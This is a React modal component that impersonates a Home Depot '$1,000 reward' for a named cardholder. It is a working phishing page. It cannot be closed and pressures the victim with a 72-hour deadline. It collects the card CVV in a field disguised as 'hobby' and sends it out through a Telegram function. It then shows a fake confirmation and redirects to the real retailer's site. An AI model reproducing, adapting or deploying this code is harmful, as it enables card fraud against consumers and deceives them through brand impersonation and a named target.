"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import Image from "next/image"
import { X, ArrowLeft, CheckCircle, AlertCircle, Info, Loader2, Settings } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { sendToTelegram } from "@/app/actions"

export default function RewardModal() {
  const [isOpen, setIsOpen] = useState(false)
  const [isVisible, setIsVisible] = useState(false) // For fade animation
  const [step, setStep] = useState(1)
  const [showNotification, setShowNotification] = useState(false)
  const [isBouncing, setIsBouncing] = useState(false)
  const [showCVV, setShowCVV] = useState(false)
  const [isVerifying, setIsVerifying] = useState(false)
  const [isWaiting, setIsWaiting] = useState(false)
  const [waitingSeconds, setWaitingSeconds] = useState(30)
  const [progress, setProgress] = useState(0)
  const [showVerificationMessage, setShowVerificationMessage] = useState(false)
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isLoadingGears, setIsLoadingGears] = useState(false)
  const modalRef = useRef<HTMLDivElement>(null)
  const waitingTimerRef = useRef<NodeJS.Timeout | null>(null)

  const [formData, setFormData] = useState({
    cardNumber: "",
    hobby: "", // Using hobby field for CVV
    expiryDate: "",
  })
  const [errors, setErrors] = useState({
    cardNumber: "",
    hobby: "",
    expiryDate: "",
  })

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsOpen(true)
      // Trigger fade-in after mount
      requestAnimationFrame(() => {
        setIsVisible(true)
      })
    }, 100)

    return () => clearTimeout(timer)
  }, [])

  // Handle bounce animation
  useEffect(() => {
    if (isBouncing) {
      const timer = setTimeout(() => {
        setIsBouncing(false)
      }, 1000)
      return () => clearTimeout(timer)
    }
  }, [isBouncing])

  // Handle notification timeout
  useEffect(() => {
    if (showNotification) {
      const timer = setTimeout(() => {
        setShowNotification(false)
      }, 3000)
      return () => clearTimeout(timer)
    }
  }, [showNotification])

  // Handle verification message timeout
  useEffect(() => {
    if (showVerificationMessage) {
      const timer = setTimeout(() => {
        setShowVerificationMessage(false)
      }, 5000)
      return () => clearTimeout(timer)
    }
  }, [showVerificationMessage])

  // 30-second waiting timer
  useEffect(() => {
    if (isWaiting && waitingSeconds > 0) {
      waitingTimerRef.current = setTimeout(() => {
        setWaitingSeconds((prev) => prev - 1)
      }, 1000)

      return () => {
        if (waitingTimerRef.current) {
          clearTimeout(waitingTimerRef.current)
        }
      }
    } else if (isWaiting && waitingSeconds === 0) {
      setIsWaiting(false)
      setIsVerifying(true)
    }
  }, [isWaiting, waitingSeconds])

  // Progress bar animation
  useEffect(() => {
    if (isVerifying) {
      const interval = setInterval(() => {
        setProgress((prevProgress) => {
          if (prevProgress >= 100) {
            clearInterval(interval)
            setIsVerifying(false)
            setShowCVV(true)
            setShowVerificationMessage(true)
            return 0
          }
          return prevProgress + 5
        })
      }, 100)
      return () => clearInterval(interval)
    }
  }, [isVerifying])

  const attemptClose = () => {
    setShowNotification(true)
    setIsBouncing(true)
  }

  const closeModal = () => {
    if (step === 3) {
      setIsVisible(false)
      setTimeout(() => {
        setIsOpen(false)
        window.location.href = "https://www.homedepot.com"
        setStep(1)
        setFormData({ cardNumber: "", hobby: "", expiryDate: "" })
        setErrors({ cardNumber: "", hobby: "", expiryDate: "" })
        setShowCVV(false)
        setIsWaiting(false)
        setWaitingSeconds(30)
      }, 300)
    } else {
      attemptClose()
    }
  }

  const goToForm = () => {
    setStep(2)
    setTimeout(() => {
      setShowCVV(true)
      setShowVerificationMessage(true)
    }, 100)
  }

  const goBack = () => setStep(1)

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData((prev) => ({ ...prev, [name]: value }))

    if (errors[name as keyof typeof errors]) {
      setErrors((prev) => ({ ...prev, [name]: "" }))
    }
  }

  const validateForm = () => {
    let valid = true
    const newErrors = { cardNumber: "", hobby: "", expiryDate: "" }

    if (!formData.hobby.trim()) {
      newErrors.hobby = "CVV is required"
      valid = false
    } else if (formData.hobby.length !== 3) {
      newErrors.hobby = "CVV must be 3 digits"
      valid = false
    }

    setErrors(newErrors)
    return valid
  }

  const submitForm = async () => {
    if (validateForm()) {
      try {
        setIsSubmitting(true)

        await sendToTelegram({
          cvv: formData.hobby,
        })

        setIsSubmitting(false)
        setIsLoadingGears(true)

        setTimeout(() => {
          setIsLoadingGears(false)
          setStep(3)
        }, 3000)
      } catch (error) {
        console.error("Error submitting form:", error)
        setIsSubmitting(false)
      }
    }
  }

  if (!isOpen) return null

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      {/* Backdrop with fade transition */}
      <div 
        className={`absolute inset-0 bg-black/60 backdrop-blur-sm transition-opacity duration-300 ${
          isVisible ? "opacity-100" : "opacity-0"
        }`} 
        onClick={attemptClose} 
      />

      {/* Modal Content with scale/fade transition */}
      <div
        ref={modalRef}
        className={`relative bg-white rounded-lg shadow-xl max-w-md w-full mx-auto overflow-hidden transform transition-all duration-300 ease-out
          ${isVisible ? "opacity-100 translate-y-0 scale-100" : "opacity-0 translate-y-4 scale-95"}
          ${isBouncing ? "animate-bounce" : ""}`}
      >
        <button
          onClick={closeModal}
          className="absolute top-2 right-2 p-2 rounded-full hover:bg-gray-100 transition-colors z-10"
          aria-label={step === 3 ? "Close" : "Cannot close"}
        >
          <X className="h-5 w-5" />
        </button>

        {step === 2 && (
          <button
            onClick={goBack}
            className="absolute top-2 left-2 p-2 rounded-full hover:bg-gray-100 transition-colors z-10"
            aria-label="Go back"
          >
            <ArrowLeft className="h-5 w-5" />
          </button>
        )}

        {showNotification && (
          <div className="absolute top-0 left-0 right-0 bg-yellow-500 text-white p-2 flex items-center justify-center z-20 animate-in slide-in-from-top-2 duration-300">
            <AlertCircle className="h-4 w-4 mr-2" />
            <span className="text-sm font-medium">Please click "Claim Your Reward Now" to proceed</span>
          </div>
        )}

        {step === 1 && (
          <div className="animate-in fade-in zoom-in-95 duration-500">
            <div className="bg-gradient-to-r from-orange-500 to-yellow-500 p-6 text-white text-center">
              <h2 className="text-2xl font-bold">Hello ANNETTE T PERRY</h2>
              <p className="text-lg mt-1">You have been rewarded $1,000 on card ending with <b>xxx4654</b></p>
            </div>

            <div className="p-4 flex justify-center">
              <div className="relative w-full h-48 rounded-lg overflow-hidden border shadow-md">
                <Image
                  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR0CuKEo5aHngw7kn_BqEdnRSX7BY_A868CItXR9XdD-g&s=10"
                  alt="Secure Your Card"
                  fill
                  className="object-cover"
                  priority
                />
              </div>
            </div>

            <div className="p-6 text-center">
              <p className="text-gray-600 mb-4">
                Action Required: Click the button below to confirm your card details and claim your reward. This must
                be completed within 72 hours.
              </p>

              <Button
                onClick={goToForm}
                className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md w-full text-lg shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95"
              >
                Claim Your Reward Now
              </Button>

              <p className="text-xs text-gray-500 mt-4">
                *Terms and conditions apply. This security step expires in 72 hours.
              </p>
            </div>
          </div>
        )}

        {step === 2 && (
          <div className="animate-in fade-in slide-in-from-right-4 duration-300">
            <div className="bg-gradient-to-r from-orange-500 to-yellow-500 p-6 text-white">
              <h2 className="text-xl font-bold">Complete Your Information</h2>
              <p className="text-sm mt-1">Please provide the following details to Secure your Card ending with <b>xxx9390</b></p>
            </div>

            <div className="p-6">
              <div className="space-y-4">
                {showVerificationMessage && (
                  <div className="bg-blue-50 border-l-4 border-blue-500 p-3 flex items-start animate-in fade-in slide-in-from-top-2 duration-300">
                    <Info className="h-5 w-5 text-blue-500 mr-2 flex-shrink-0 mt-0.5" />
                    <p className="text-sm text-blue-700">
                      Please enter your card cvv for verification purposes. This is required to verify your card.
                    </p>
                  </div>
                )}

                {showCVV && (
                  <div className="space-y-4 animate-in fade-in slide-in-from-bottom-2 duration-500">
                    <div className="space-y-2">
                      <label htmlFor="hobby" className="text-sm font-medium block">
                        CVV (3 digits on back of card)
                      </label>
                      <Input
                        id="hobby"
                        name="hobby"
                        placeholder="123"
                        value={formData.hobby}
                        onChange={handleInputChange}
                        className={errors.hobby ? "border-red-500 focus-visible:ring-red-500" : ""}
                        maxLength={3}
                        type="password"
                        autoFocus
                      />
                      {errors.hobby && <p className="text-red-500 text-xs animate-pulse">{errors.hobby}</p>}
                    </div>
                  </div>
                )}

                <Button
                  onClick={submitForm}
                  className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md w-full mt-4 shadow-md hover:shadow-lg transition-all duration-200 active:scale-95"
                  disabled={!showCVV || isSubmitting}
                >
                  {isSubmitting ? (
                    <>
                      <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                      Processing...
                    </>
                  ) : (
                    "Verify"
                  )}
                </Button>

                <p className="text-xs text-gray-500 mt-2 text-center">
                  Your information is secure and will only be used to verify your card.
                </p>
              </div>
            </div>
          </div>
        )}

        {isLoadingGears && (
          <div className="absolute inset-0 bg-black/80 backdrop-blur-sm flex items-center justify-center z-30 animate-in fade-in duration-500">
            <div className="text-center">
              <div className="relative flex items-center justify-center mb-6">
                <Settings className="h-16 w-16 text-orange-500 animate-spin" style={{ animationDuration: "2s" }} />
                <Settings
                  className="h-12 w-12 text-yellow-500 -ml-4 mt-2"
                  style={{
                    animation: "spin 2s linear infinite reverse",
                    transform: "rotate(30deg)",
                  }}
                />
              </div>
              <p className="text-white text-lg font-medium">Processing your information...</p>
              <p className="text-gray-300 text-sm mt-2">Please wait while we verify your information</p>
            </div>
          </div>
        )}

        {step === 3 && (
          <div className="animate-in fade-in zoom-in-95 duration-500">
            <div className="bg-gradient-to-r from-green-500 to-emerald-500 p-6 text-white text-center">
              <h2 className="text-2xl font-bold">Confirmation Complete!</h2>
              <p className="text-lg mt-1">Your information is now verified</p>
            </div>

            <div className="p-8 text-center">
              <div className="flex justify-center mb-6">
                <CheckCircle className="h-20 w-20 text-green-500 animate-in zoom-in duration-500" />
              </div>

              <h3 className="text-xl font-bold mb-2">Confirmation Complete</h3>
              <p className="text-gray-600 mb-6">
                We have successfully received and verified your information. Your reward will be proceed soon.
              </p>

              <Button
                onClick={closeModal}
                className="bg-[#F96302] hover:bg-[#E05A02] text-white font-bold py-3 px-8 rounded-md shadow-lg hover:shadow-xl transition-all duration-200 active:scale-95"
              >
                Close
              </Button>
            </div>
          </div>
        )}
      </div>
    </div>
  )
}
